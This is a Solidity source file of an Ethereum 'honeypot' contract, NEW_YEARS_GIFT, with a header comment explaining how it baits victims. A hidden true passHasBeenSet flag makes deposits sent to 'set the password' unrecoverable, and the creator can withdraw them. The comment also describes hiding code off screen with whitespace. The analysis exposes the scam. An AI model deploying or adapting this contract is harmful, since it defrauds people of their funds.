// 0x13c547Ff0888A0A876E6F1304eaeFE9E6E06FC4B
// https://ethereum.stackexchange.com/questions/39697/how-does-this-honeypot-contract-work explanation

/* This contract takes advantage of a small flaw in a third party resource that many of us use, etherscan. The flaw being that etherscan doesn't show contract A calling functions from contract B as a transaction under contracts B's history, making it easy to obfuscate function calls. Basically, this contract works by allowing the user to set the hashPass only if passHasBeenSet is false. Anyone who knows the input that produced the value of hashPass can claim the funds of this contract by calling GetGift. Of course, the storage variable passHasBeenSet is private and therefore not readable via etherscan. Luckily, we can use web3 and check the value of the variable ourselves:

> web3.eth.getStorageAt("0x13c547Ff0888A0A876E6F1304eaeFE9E6E06FC4B", 1)
< "0x00000000000000000000008ca354f7e84881157bdbc36d8c40d5b5077621b601"

Note that sender and passHasBeenSet belong to the same storage slot since addresses take up 20 bytes and booleans take up 1 byte (storage slots are 32 bytes). Therefore the last two characters belong to passHasBeenSet, which has a value of 01 -> true.

On a side note, I've contacted etherscan about this issue and I imagine they will fix this at some point - which reminds me; a friend of mine recently contacted etherscan about another flaw where the contract source code wasn't being wrapped. Someone posted a very similar honeypot to this one where there was code being prefixed by a ridiculous number of spaces resulting in the code being rendered off screen (unless you happened to see the tiny horizontal scrollbar and scrolled over). Etherscan has since fixed this issue, in a timely matter too. 
*/


pragma solidity ^0.4.19;

contract NEW_YEARS_GIFT
{
    string message;
    
    bool passHasBeenSet = false;
    
    address sender;
    
    bytes32 public hashPass;
	
	function() public payable{}
    
    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
        {
            hashPass = hash;
            sender = msg.sender;
        }
    }
    
    function SetMessage(string _message)
    public
    {
        if(msg.sender==sender)
        {
            message =_message;
        }
    }
    
    function GetGift(bytes pass)
    external
    payable
    returns (string)
    {
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
            return message;
        }
    }
    
    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
            message="";
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(msg.sender==sender&&hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }
}
